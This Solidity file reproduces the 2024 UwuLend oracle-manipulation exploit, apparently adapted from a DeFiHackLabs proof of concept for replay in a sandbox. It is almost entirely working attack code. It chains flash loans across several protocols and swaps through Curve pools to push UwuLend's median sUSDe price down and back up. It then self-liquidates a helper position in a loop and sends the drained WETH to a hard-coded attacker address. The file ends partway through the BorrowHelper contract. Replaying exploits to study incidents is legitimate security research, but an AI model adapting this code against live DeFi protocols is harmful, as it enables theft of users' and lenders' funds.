// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-06-UwuLend_First).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (`UwuLend_First_exp`) — `address(this)` IS the attacker/exploit, and every
// flash-loan callback (onFlashLoan, executeOperation, onMorphoFlashLoan,
// uniswapV3FlashCallback, receiveFlashLoan, uniswapV3SwapCallback) lives on the
// test itself. There is no standalone exploit contract to deploy. This contract
// is a faithful, self-contained copy of that inline attack (testExploit's body
// moved into run(), all callbacks kept, the two helper contracts kept verbatim)
// so the playground can deploy it and record run(). Logic and constants are
// copied verbatim from test/UwuLend_First_exp.sol.
//
// The Curve/Uniswap price-manipulation swap sequences (driveDown / driveUp /
// repayFlashLoans) are split into a separate SwapLogic contract, invoked via
// delegatecall from the main contract, purely to keep UwuLendFirstDrain's own
// deployed bytecode under the EIP-170 24KB limit (the full inline attack is one
// large contract on-chain; the split is an artifact of this standalone repro,
// not part of the real attack — delegatecall preserves address(this)/msg.sender
// semantics exactly as if the code ran inline).
//
// Root cause: UwuLend's sUSDe price feed (sUSDePriceProviderBUniCatch) computes
// the median of 11 candidate prices, 6 of which (5 Curve spot legs + 1 Uni TWAP)
// are attacker-manipulable inside a single transaction. The attacker flash-loans
// a war chest, drives the median DOWN to open a maximally-leveraged self-owned
// sUSDe debt position, drives the median back UP to make that position
// undercollateralized, then repeatedly self-liquidates it for the 110%
// liquidation bonus, walking away with the WETH-denominated residual.

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface ISDAIMin is IERC20Min {
    function redeem(uint256 amount, address to, address owner) external returns (uint256);
}

interface ICurvePoolMin {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy, address receiver) external returns (uint256);
}

interface IUniPairV3Min {
    function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes calldata data)
        external
        returns (int256 amount0, int256 amount1);
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IAaveFlashloanMin {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IMorphoBlueFlashLoanMin {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IUniswapV3FlashMin {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IBalancerVaultMin {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
}

interface IMakerDaoFlashMin {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external returns (bool);
}

interface ILendingPoolMin {
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;
    function repay(address asset, uint256 amount, int256 rateMode, address onBehalfOf) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
    function liquidationCall(address collateralAsset, address debtAsset, address user, uint256 debtToCover, bool receiveAToken)
        external;
    function getUserAccountData(address user)
        external
        view
        returns (
            uint256 totalCollateral,
            uint256 totalDebt,
            uint256 availableBorrows,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor
        );
}

interface IcrvUSDControllerMin {
    function create_loan(uint256 collateral_amount, uint256 debt_amount, uint256 N) external;
    function repay(uint256 amount, address to, int256 max_fee, bool) external;
}

interface IAaveOracleMin {
    function getAssetPrice(address asset) external view returns (uint256);
}

// ---------------------------------------------------------------------------
// SwapLogic — the Curve/Uniswap price-manipulation legs AND the liquidation /
// unwind cascade, called via delegatecall from UwuLendFirstDrain so they
// execute with address(this) == the main exploit contract (same token
// balances / approvals / storage as if this code ran inline there). This
// split exists purely to keep UwuLendFirstDrain's own deployed bytecode under
// the EIP-170 24KB limit for this standalone repro — it is not part of the
// real historical attack, which ran as one inline contract.
//
// Storage layout MUST match UwuLendFirstDrain's leading slots exactly
// (toBeLiquidatedHelper, borrowHelper) since these functions run via
// delegatecall against the main contract's storage.
// ---------------------------------------------------------------------------
contract SwapLogic {
    // --- storage layout mirror (must match UwuLendFirstDrain's leading slots) ---
    // UwuLendFirstDrain.swapLogic is `immutable`, so it occupies no storage
    // slot — these two are the first (and only) storage slots in both contracts.
    ToBeLiquidatedHelper toBeLiquidatedHelper;
    BorrowHelper borrowHelper;

    IERC20Min constant WETH = IERC20Min(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20Min constant DAI = IERC20Min(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20Min constant WBTC = IERC20Min(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20Min constant sUSDE = IERC20Min(0x9D39A5DE30e57443BfF2A8307A4256c8797A3497);
    IERC20Min constant USDC = IERC20Min(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20Min constant FRAX = IERC20Min(0x853d955aCEf822Db058eb8505911ED77F175b99e);
    IcrvUSDControllerMin constant crvUSDController = IcrvUSDControllerMin(0xA920De414eA4Ab66b97dA1bFE9e6EcA7d4219635);
    ISDAIMin constant sDAI = ISDAIMin(0x83F20F44975D03b1b09e64809B757c47f942BEeA);

    ICurvePoolMin constant USDecrvUSDPool = ICurvePoolMin(0xF55B0f6F2Da5ffDDb104b58a60F2862745960442);
    ICurvePoolMin constant USDeDAIPool = ICurvePoolMin(0xF36a4BA50C603204c3FC6d2dA8b78A7b69CBC67d);
    ICurvePoolMin constant FRAXUSDePool = ICurvePoolMin(0x5dc1BF6f1e983C0b21EfB003c105133736fA0743);
    ICurvePoolMin constant GHOUSDePool = ICurvePoolMin(0x670a72e6D22b0956C0D2573288F82DCc5d6E3a61);
    ICurvePoolMin constant USDCUSDePool = ICurvePoolMin(0x02950460E2b9529D0E00284A5fA2d7bDF3fA4d72);
    ICurvePoolMin constant MtEthena = ICurvePoolMin(0x167478921b907422F8E88B43C4Af2B8BEa278d3A);

    IUniPairV3Min constant DAI_FRAX_Pair = IUniPairV3Min(0x97e7d56A0408570bA1a7852De36350f7713906ec);
    IUniPairV3Min constant DAI_USDC_Pair = IUniPairV3Min(0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168);
    IUniPairV3Min constant USDC_WETH_Pair = IUniPairV3Min(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    IUniPairV3Min constant WBTC_WETH_Pair = IUniPairV3Min(0x4585FE77225b41b697C938B018E2Ac67Ac5a20c0);
    IERC20Min constant GHO = IERC20Min(0x40D16FC0246aD3160Ccc09B8D0D3A2cD28aE6C2f);

    ILendingPoolMin constant uwuLendPool = ILendingPoolMin(0x2409aF0251DCB89EE3Dee572629291f9B087c668);
    IERC20Min constant uSUSDE = IERC20Min(0xf1293141fC6ab23b2a0143Acc196e3429e0B67A6);
    IERC20Min constant uWETH = IERC20Min(0x67fadbD9Bf8899d7C578db22D7af5e2E500E13e5);
    IERC20Min constant uWBTC = IERC20Min(0x6Ace5c946a3Abd8241f31f182c479e67A4d8Fc8d);
    IERC20Min constant uDAI = IERC20Min(0xb95BD0793bCC5524AF358ffaae3e38c3903C7626);

    function approveMakerDaoFlash() external {
        DAI.approve(0x60744434d6339a6B27d73d9Eda62b6F66a0a04FA, type(uint256).max);
    }

    // 3.2-3.5: manipulate the median down, open a maxed-out self-owned sUSDe
    // debt position, shrink collateral to the threshold, manipulate the
    // median back up. Mirrors the corresponding steps of onFlashLoan().
    function openBadDebtPosition() external {
        driveDownsUSDEPrice();

        uwuLendPool.deposit(address(WBTC), WBTC.balanceOf(address(this)), address(this), 0);
        uwuLendPool.deposit(address(DAI), DAI.balanceOf(address(this)) - 30_000_000 ether, address(this), 0);
        uwuLendPool.deposit(address(sUSDE), sUSDE.balanceOf(address(this)), address(this), 0);
        uwuLendPool.setUserUseReserveAsCollateral(address(sUSDE), false);

        WETH.transfer(address(toBeLiquidatedHelper), WETH.balanceOf(address(this)));
        toBeLiquidatedHelper.openPosition();
        uwuLendPool.borrow(address(WETH), WETH.balanceOf(address(uWETH)), 2, 0, address(this));
        WETH.transfer(address(toBeLiquidatedHelper), WETH.balanceOf(address(this)));
        toBeLiquidatedHelper.openPosition();

        toBeLiquidatedHelper.withdrawCollateralToLiquidationThreshold();

        driveUpsUSDEPrice();
    }

    // 4.1-4.3: repeatedly self-liquidate the now-undercollateralized position,
    // withdraw everything seized, and borrow the rest of the protocol's
    // liquidity against the stolen sUSDe collateral.
    function liquidateAndBorrow() external {
        uwuLendPool.liquidationCall(
            address(WETH), address(sUSDE), address(toBeLiquidatedHelper), sUSDE.balanceOf(address(this)), true
        );
        while (uWETH.balanceOf(address(toBeLiquidatedHelper)) > 0) {
            uwuLendPool.withdraw(address(sUSDE), sUSDE.balanceOf(address(uSUSDE)), address(this));
            uwuLendPool.liquidationCall(
                address(WETH), address(sUSDE), address(toBeLiquidatedHelper), sUSDE.balanceOf(address(this)), true
            );
        }

        uwuLendPool.withdraw(address(WETH), WETH.balanceOf(address(uWETH)), address(this));
        uwuLendPool.repay(address(WETH), type(uint256).max, 2, address(this));
        uwuLendPool.withdraw(address(WETH), uWETH.balanceOf(address(this)), address(this));

        uwuLendPool.withdraw(address(WBTC), uWBTC.balanceOf(address(this)), address(this));
        uwuLendPool.withdraw(address(DAI), uDAI.balanceOf(address(this)), address(this));
        uwuLendPool.withdraw(address(sUSDE), sUSDE.balanceOf(address(uSUSDE)), address(this));

        uwuLendPool.deposit(address(sUSDE), 4_346_738_161_827_961_681_800_155, address(this), 0);
        uSUSDE.transfer(address(borrowHelper), uSUSDE.balanceOf(address(this)));

        borrowHelper.borrow();

        _repayFlashLoans();
    }

    function driveDownsUSDEPrice() public {
        crvUSDController.create_loan(10_000 ether, 8_000_000 ether, 6);

        USDecrvUSDPool.exchange(0, 1, 8_730_453_498_050_216_501_648_556, 0, address(this));
        USDeDAIPool.exchange(0, 1, 14_477_791_691_163_726_567_797_192, 0, address(this));
        FRAXUSDePool.exchange(1, 0, 46_652_158_056_743_271_680_044_538, 0, address(this));
        GHOUSDePool.exchange(1, 0, 4_925_427_200_616_322_077_942_681, 0, address(this));
        USDCUSDePool.exchange(0, 1, 14_886_912_832_938_992_141_787_347, 0, address(this));
    }

    function driveUpsUSDEPrice() public {
        USDecrvUSDPool.exchange(1, 0, 12_924_955_610_043_587_089_395_372, 0, address(this));
        USDeDAIPool.exchange(1, 0, 25_373_741_448_450_577_167_233_296, 0, address(this));
        FRAXUSDePool.exchange(0, 1, 69_315_752_743_500_180_119_051_361, 0, address(this));
        GHOUSDePool.exchange(0, 1, 8_765_879_316_233_443_559_385_780, 0, address(this));
        USDCUSDePool.exchange(1, 0, 27_858_597_561_515, 0, address(this));
    }

    function repayFlashLoans() external {
        _repayFlashLoans();
    }

    function _repayFlashLoans() internal {
        USDecrvUSDPool.exchange(0, 1, 4_207_072_750_824_992_858_620_994, 0, address(this));
        USDeDAIPool.exchange(0, 1, 10_922_948_419_648_084_328_018_472, 0, address(this));
        FRAXUSDePool.exchange(1, 0, 22_726_036_777_489_049_150_148_818, 0, address(this));
        GHOUSDePool.exchange(1, 0, 3_839_532_488_615_605_211_975_616, 0, address(this));
        USDCUSDePool.exchange(0, 1, 13_004_083_286_363_350_285_706_546, 0, address(this));

        crvUSDController.repay(8_000_000 ether, address(this), type(int256).max, false);
        GHOUSDePool.exchange(0, 1, 6_514_807_919_582_140_746_012, 0, address(this));

        sUSDE.approve(address(MtEthena), type(uint256).max);
        MtEthena.exchange(1, 0, 461_496_017_260_554_794_537_319, 0, address(this));
        sDAI.redeem(sDAI.balanceOf(address(this)), address(this), address(this));

        USDecrvUSDPool.exchange(1, 0, 13_674_859_859_068_798_018_828, 0, address(this));
        USDCUSDePool.exchange(1, 0, 192_649_121_137, 0, address(this));
        USDCUSDePool.exchange(0, 1, 5_476_157_462_097_941_699_706, 0, address(this));

        DAI_FRAX_Pair.swap(
            address(this), false, 43_839_520_259_800_487_407_899, 88_130_155_430_238_081_648_620_165_685, ""
        );

        int256 swapAmount = int256(
            DAI.balanceOf(address(this)) - (100_786_052_157_846_064_524_359_193 + 500_000_000_000_000_000_000_000_000)
        );
        DAI_USDC_Pair.swap(address(this), true, swapAmount, 71_305_012_436_624_238_479_427, "");

        swapAmount = int256(USDC.balanceOf(address(this)) - 15_007_500_000_000);
        USDC_WETH_Pair.swap(address(this), true, swapAmount, 1_176_655_315_611_429_354_240_742_931_620_633, "");

        WBTC_WETH_Pair.swap(address(this), false, -740_000_000, 38_270_603_846_108_809_178_175_541_220_721_878, "");
    }

    // --- flash-loan provider callbacks + approvals, reached via the main
    // contract's fallback() delegatecall dispatcher (see UwuLendFirstDrain).
    // address(this) here is the main contract's address (delegatecall), so
    // "msg.sender == address(this)" comparisons the providers see, and the
    // token custody, are identical to running this code inline in main. ---

    IAaveFlashloanMin constant aaveFlashloan_1 = IAaveFlashloanMin(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IAaveFlashloanMin constant aaveFlashloan_2 = IAaveFlashloanMin(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IAaveFlashloanMin constant sparkPool = IAaveFlashloanMin(0xC13e21B648A5Ee794902342038FF3aDAB66BE987);
    IMorphoBlueFlashLoanMin constant morphoBlueFlashLoan = IMorphoBlueFlashLoanMin(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
    IUniswapV3FlashMin constant FRAX_USDC_Pair = IUniswapV3FlashMin(0xc63B0708E2F7e69CB8A1df0e1389A98C35A76D52);
    IBalancerVaultMin constant BalancerVault = IBalancerVaultMin(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IMakerDaoFlashMin constant makerDaoFlash = IMakerDaoFlashMin(0x60744434d6339a6B27d73d9Eda62b6F66a0a04FA);
    IERC20Min constant crvUSD = IERC20Min(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E);
    IERC20Min constant USDE = IERC20Min(0x4c9EDD5852cd905f086C759E8383e09bff1E68B3);

    function depositsUSDEBackToUWULendPool() external {
        uwuLendPool.deposit(address(sUSDE), sUSDE.balanceOf(address(this)), address(this), 0);
    }
}

// ---------------------------------------------------------------------------
// CascadeLogic — the flash-loan-provider callbacks (executeOperation,
// onMorphoFlashLoan, uniswapV3FlashCallback, receiveFlashLoan,
// uniswapV3SwapCallback) and approveAll/flashLoan, also reached via
// delegatecall/fallback from UwuLendFirstDrain. Split from SwapLogic purely
// because the combined logic no longer fits under the EIP-170 24KB limit as
// one deployed contract — not part of the real historical attack.
// ---------------------------------------------------------------------------
contract CascadeLogic {
    IERC20Min constant WETH = IERC20Min(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20Min constant DAI = IERC20Min(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20Min constant crvUSD = IERC20Min(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E);
    IERC20Min constant WBTC = IERC20Min(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20Min constant sUSDE = IERC20Min(0x9D39A5DE30e57443BfF2A8307A4256c8797A3497);
    IERC20Min constant USDE = IERC20Min(0x4c9EDD5852cd905f086C759E8383e09bff1E68B3);
    IERC20Min constant GHO = IERC20Min(0x40D16FC0246aD3160Ccc09B8D0D3A2cD28aE6C2f);
    IERC20Min constant USDC = IERC20Min(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20Min constant FRAX = IERC20Min(0x853d955aCEf822Db058eb8505911ED77F175b99e);
    IcrvUSDControllerMin constant crvUSDController = IcrvUSDControllerMin(0xA920De414eA4Ab66b97dA1bFE9e6EcA7d4219635);

    ICurvePoolMin constant USDecrvUSDPool = ICurvePoolMin(0xF55B0f6F2Da5ffDDb104b58a60F2862745960442);
    ICurvePoolMin constant USDeDAIPool = ICurvePoolMin(0xF36a4BA50C603204c3FC6d2dA8b78A7b69CBC67d);
    ICurvePoolMin constant FRAXUSDePool = ICurvePoolMin(0x5dc1BF6f1e983C0b21EfB003c105133736fA0743);
    ICurvePoolMin constant GHOUSDePool = ICurvePoolMin(0x670a72e6D22b0956C0D2573288F82DCc5d6E3a61);
    ICurvePoolMin constant USDCUSDePool = ICurvePoolMin(0x02950460E2b9529D0E00284A5fA2d7bDF3fA4d72);

    IUniPairV3Min constant DAI_FRAX_Pair = IUniPairV3Min(0x97e7d56A0408570bA1a7852De36350f7713906ec);
    IUniPairV3Min constant DAI_USDC_Pair = IUniPairV3Min(0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168);
    IUniPairV3Min constant USDC_WETH_Pair = IUniPairV3Min(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    IUniPairV3Min constant WBTC_WETH_Pair = IUniPairV3Min(0x4585FE77225b41b697C938B018E2Ac67Ac5a20c0);

    IAaveFlashloanMin constant aaveFlashloan_1 = IAaveFlashloanMin(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IAaveFlashloanMin constant aaveFlashloan_2 = IAaveFlashloanMin(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IAaveFlashloanMin constant sparkPool = IAaveFlashloanMin(0xC13e21B648A5Ee794902342038FF3aDAB66BE987);
    IMorphoBlueFlashLoanMin constant morphoBlueFlashLoan = IMorphoBlueFlashLoanMin(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
    IUniswapV3FlashMin constant FRAX_USDC_Pair = IUniswapV3FlashMin(0xc63B0708E2F7e69CB8A1df0e1389A98C35A76D52);
    IBalancerVaultMin constant BalancerVault = IBalancerVaultMin(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IMakerDaoFlashMin constant makerDaoFlash = IMakerDaoFlashMin(0x60744434d6339a6B27d73d9Eda62b6F66a0a04FA);

    ILendingPoolMin constant uwuLendPool = ILendingPoolMin(0x2409aF0251DCB89EE3Dee572629291f9B087c668);

    function flashLoan() external {
        address[] memory assets_1 = new address[](2);
        assets_1[0] = address(WETH);
        assets_1[1] = address(WBTC);
        uint256[] memory amounts_1 = new uint256[](2);
        amounts_1[0] = 159_053_162_780_836_655_603_083;
        amounts_1[1] = 1_480_000_000_000;
        uint256[] memory modes_1 = new uint256[](2);
        modes_1[0] = 0;
        modes_1[1] = 0;
        aaveFlashloan_1.flashLoan(address(this), assets_1, amounts_1, modes_1, address(0), "", 0);
    }

    // aaveFlashloan_1 callback
    function executeOperation(address[] calldata, uint256[] calldata, uint256[] calldata, address, bytes calldata)
        external
        payable
        returns (bool)
    {
        if (msg.sender == address(aaveFlashloan_1)) {
            WETH.approve(address(msg.sender), type(uint256).max);
            WBTC.approve(address(msg.sender), type(uint256).max);

            address[] memory assets_2 = new address[](1);
            assets_2[0] = address(WETH);
            uint256[] memory amounts_2 = new uint256[](1);
            amounts_2[0] = 40_000_000_000_000_000_000_000;
            uint256[] memory modes_2 = new uint256[](1);
            modes_2[0] = 0;
            aaveFlashloan_2.flashLoan(address(this), assets_2, amounts_2, modes_2, address(0), "", 0);
            return true;
        } else if (msg.sender == address(aaveFlashloan_2)) {
            WETH.approve(address(msg.sender), type(uint256).max);

            address[] memory assets_3 = new address[](2);
            assets_3[0] = address(WETH);
            assets_3[1] = address(WBTC);
            uint256[] memory amounts_3 = new uint256[](2);
            amounts_3[0] = 91_075_709_275_272_202_604_853;
            amounts_3[1] = 497_979_338_310;
            uint256[] memory modes_3 = new uint256[](2);
            modes_3[0] = 0;
            modes_3[1] = 0;
            sparkPool.flashLoan(address(this), assets_3, amounts_3, modes_3, address(0), "", 0);
            return true;
        } else if (msg.sender == address(sparkPool)) {
            WETH.approve(address(msg.sender), type(uint256).max);
            WBTC.approve(address(msg.sender), type(uint256).max);

            morphoBlueFlashLoan.flashLoan(address(sUSDE), 301_738_880_017_013_808_137_779_682, "");
            return true;
        }
        return false;
    }

    function onMorphoFlashLoan(uint256 amounts, bytes calldata) external {
        if (amounts == 301_738_880_017_013_808_137_779_682) {
            sUSDE.approve(address(morphoBlueFlashLoan), type(uint256).max);
            morphoBlueFlashLoan.flashLoan(address(USDE), 236_934_023_171_356_495_803_977_358, "");
        } else if (amounts == 236_934_023_171_356_495_803_977_358) {
            USDE.approve(address(morphoBlueFlashLoan), type(uint256).max);
            morphoBlueFlashLoan.flashLoan(address(DAI), 100_786_052_157_846_064_524_359_193, "");
        } else if (amounts == 100_786_052_157_846_064_524_359_193) {
            DAI.approve(address(morphoBlueFlashLoan), type(uint256).max);

            FRAX_USDC_Pair.flash(address(this), 60_000_000_000_000_000_000_000_000, 15_000_000_000_000, "");
        }
    }

    function uniswapV3FlashCallback(uint256, uint256, bytes calldata) external {
        address[] memory tokens = new address[](2);
        tokens[0] = address(GHO);
        tokens[1] = address(WETH);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 4_627_557_475_392_554_171_233_727;
        amounts[1] = 38_413_346_774_514_588_021_409;
        BalancerVault.flashLoan(address(this), tokens, amounts, "");
        FRAX.transfer(address(msg.sender), 60_030_000_000_000_000_000_000_000);
        USDC.transfer(address(msg.sender), 15_007_500_000_000);
    }

    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
        makerDaoFlash.flashLoan(address(this), address(DAI), 500_000_000_000_000_000_000_000_000, "");

        GHO.transfer(address(msg.sender), 4_627_557_475_392_554_171_233_727);
        WETH.transfer(address(msg.sender), 38_413_346_774_514_588_021_409);
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        if (msg.sender == address(DAI_FRAX_Pair)) {
            FRAX.transfer(msg.sender, uint256(amount1Delta));
        } else if (msg.sender == address(DAI_USDC_Pair)) {
            DAI.transfer(msg.sender, uint256(amount0Delta));
        } else if (msg.sender == address(USDC_WETH_Pair)) {
            USDC.transfer(msg.sender, uint256(amount0Delta));
        } else if (msg.sender == address(WBTC_WETH_Pair)) {
            WETH.transfer(msg.sender, uint256(amount1Delta));
        }
    }

    function approveAll() external {
        WETH.approve(address(uwuLendPool), type(uint256).max);
        DAI.approve(address(uwuLendPool), type(uint256).max);
        WBTC.approve(address(uwuLendPool), type(uint256).max);
        sUSDE.approve(address(uwuLendPool), type(uint256).max);
        crvUSD.approve(address(crvUSDController), type(uint256).max);
        WETH.approve(address(crvUSDController), type(uint256).max);

        crvUSD.approve(address(USDecrvUSDPool), type(uint256).max);
        USDE.approve(address(USDecrvUSDPool), type(uint256).max);
        FRAX.approve(address(FRAXUSDePool), type(uint256).max);
        USDE.approve(address(FRAXUSDePool), type(uint256).max);
        GHO.approve(address(GHOUSDePool), type(uint256).max);
        USDE.approve(address(GHOUSDePool), type(uint256).max);
        USDC.approve(address(USDCUSDePool), type(uint256).max);
        USDE.approve(address(USDCUSDePool), type(uint256).max);
        DAI.approve(address(USDeDAIPool), type(uint256).max);
        USDE.approve(address(USDeDAIPool), type(uint256).max);
    }
}

contract UwuLendFirstDrain {
    IERC20Min constant WETH = IERC20Min(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address constant ATTACKER = 0x841dDf093f5188989fA1524e7B893de64B421f47;

    // SwapLogic (price-manipulation swaps + liquidation/unwind cascade) and
    // CascadeLogic (flash-loan-provider callbacks + approveAll) carry the
    // attack's implementation and are invoked via delegatecall/fallback so
    // that UwuLendFirstDrain's own deployed bytecode stays under the EIP-170
    // 24KB limit — the combined logic no longer fits in one contract. This
    // split is an artifact of this standalone repro only — the real
    // historical attack ran as one inline contract; delegatecall preserves
    // address(this)/msg.sender/storage exactly as if the code ran inline here.
    SwapLogic immutable swapLogic;
    CascadeLogic immutable cascadeLogic;
    ToBeLiquidatedHelper toBeLiquidatedHelper;
    BorrowHelper borrowHelper;

    constructor() {
        swapLogic = new SwapLogic();
        cascadeLogic = new CascadeLogic();
    }

    // entrypoint — mirrors testExploit()
    function run() external {
        toBeLiquidatedHelper = new ToBeLiquidatedHelper();
        borrowHelper = new BorrowHelper();

        (bool okA,) = address(cascadeLogic).delegatecall(abi.encodeWithSignature("approveAll()"));
        require(okA, "approveAll failed");
        (bool okF,) = address(cascadeLogic).delegatecall(abi.encodeWithSignature("flashLoan()"));
        require(okF, "flashLoan failed");

        WETH.transfer(ATTACKER, WETH.balanceOf(address(this)));
    }

    // exploit logic — aave ERC3156-style flashloan callback. The body (steps
    // 3-4 of the attack) runs via delegatecall into SwapLogic purely to keep
    // this contract's own bytecode under the EIP-170 size limit; address(this)
    // and all storage/token balances are identical to running the code inline.
    function onFlashLoan(address, address, uint256, uint256, bytes calldata) external returns (bytes32) {
        (bool ok0,) = address(swapLogic).delegatecall(abi.encodeWithSignature("approveMakerDaoFlash()"));
        require(ok0, "approveMakerDaoFlash failed");

        // 3. Make bad debt (during liquidation) by manipulating the sUSDe median price,
        //    then open a maximally-leveraged self-owned sUSDe debt position.
        (bool ok1,) = address(swapLogic).delegatecall(abi.encodeWithSignature("openBadDebtPosition()"));
        require(ok1, "openBadDebtPosition failed");

        // 4. Repeatedly self-liquidate the now-undercollateralized helper for the
        //    110% bonus, withdraw everything seized, borrow the rest of the
        //    protocol's liquidity against the stolen sUSDe, and unwind to WETH.
        (bool ok2,) = address(swapLogic).delegatecall(abi.encodeWithSignature("liquidateAndBorrow()"));
        require(ok2, "liquidateAndBorrow failed");

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function depositsUSDEBackToUWULendPool() external {
        (bool ok,) = address(swapLogic).delegatecall(abi.encodeWithSignature("depositsUSDEBackToUWULendPool()"));
        require(ok, "depositsUSDEBackToUWULendPool failed");
    }

    // Fallback dispatcher: every flash-loan-provider callback this contract
    // must expose (executeOperation, onMorphoFlashLoan, uniswapV3FlashCallback,
    // receiveFlashLoan, uniswapV3SwapCallback) is implemented on CascadeLogic
    // and reached here via delegatecall, so this contract's own selector
    // table stays tiny while still answering to its real on-chain address.
    fallback() external payable {
        address target = address(cascadeLogic);
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), target, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    receive() external payable {}
}

contract ToBeLiquidatedHelper {
    IERC20Min constant WETH = IERC20Min(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20Min constant sUSDE = IERC20Min(0x9D39A5DE30e57443BfF2A8307A4256c8797A3497);
    ILendingPoolMin constant uwuLendPool = ILendingPoolMin(0x2409aF0251DCB89EE3Dee572629291f9B087c668);
    address constant uSUSDE = 0xf1293141fC6ab23b2a0143Acc196e3429e0B67A6;
    IAaveOracleMin constant uwuPriceOracle = IAaveOracleMin(0xAC4A2aC76D639E10f2C05a41274c1aF85B772598);

    function openPosition() external {
        WETH.approve(address(uwuLendPool), type(uint256).max);
        uwuLendPool.deposit(address(WETH), WETH.balanceOf(address(this)), address(this), 0);
        uint256 sUSDE_price = uwuPriceOracle.getAssetPrice(address(sUSDE));

        (,, uint256 availableBorrows,,,) = uwuLendPool.getUserAccountData(address(this));
        while (availableBorrows >= sUSDE.balanceOf(address(uSUSDE)) * sUSDE_price / 10 ** IERC20Min(address(sUSDE)).decimals()) {
            uwuLendPool.borrow(address(sUSDE), sUSDE.balanceOf(address(uSUSDE)), 2, 0, address(this));
            sUSDE.transfer(address(msg.sender), sUSDE.balanceOf(address(this)));
            (bool success,) =
                address(msg.sender).call(abi.encodeWithSelector(bytes4(keccak256("depositsUSDEBackToUWULendPool()"))));
            require(success, "depositsUSDEBackToUWULendPool failed");
            (,, availableBorrows,,,) = uwuLendPool.getUserAccountData(address(this));
        }

        uint256 lastAmount = availableBorrows * 10 ** IERC20Min(address(sUSDE)).decimals() / sUSDE_price;
        uwuLendPool.borrow(address(sUSDE), lastAmount, 2, 0, address(this));
        sUSDE.transfer(address(msg.sender), sUSDE.balanceOf(address(this)));
    }

    function withdrawCollateralToLiquidationThreshold() external {
        uint256 sUSDE_price = uwuPriceOracle.getAssetPrice(address(sUSDE));
        uint256 WETH_price = uwuPriceOracle.getAssetPrice(address(WETH));

        (
            uint256 totalCollateral,
            uint256 totalDebt,
            ,
            uint256 currentLiquidationThreshold,
            ,
        ) = uwuLendPool.getUserAccountData(address(this));
        uint256 maxWithdraw = totalCollateral - (totalDebt * 10_000 / currentLiquidationThreshold);
        maxWithdraw = maxWithdraw * 10 ** IERC20Min(address(WETH)).decimals() / WETH_price;
        uwuLendPool.withdraw(address(WETH), maxWithdraw, address(this));

        WETH.transfer(address(msg.sender), WETH.balanceOf(address(this)));
    }
}

contract BorrowHelper {
    IERC20Min constant WETH = IERC20Min(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20Min constant uWETH = IERC20Min(0x67fadbD9Bf8899d7C578db22D7af5e2E500E13e5);
    IERC20Min constant sUSDE = IERC20Min(0x9D39A5DE30e57443BfF2A8307A4256c8797A3497);
    ILendingPoolMin constant uwuLendPool = ILendingPoolMin(0x2409aF0251DCB89EE3Dee572629291f9B087c668);
    IERC20Min constant uSUSDE = IERC20Min(0xf1293141fC6ab23b2a0143Acc196e3429e0B67A6);
    IERC20Min constant DAI = IERC20Min(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20Min constant WBTC = IERC20Min(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
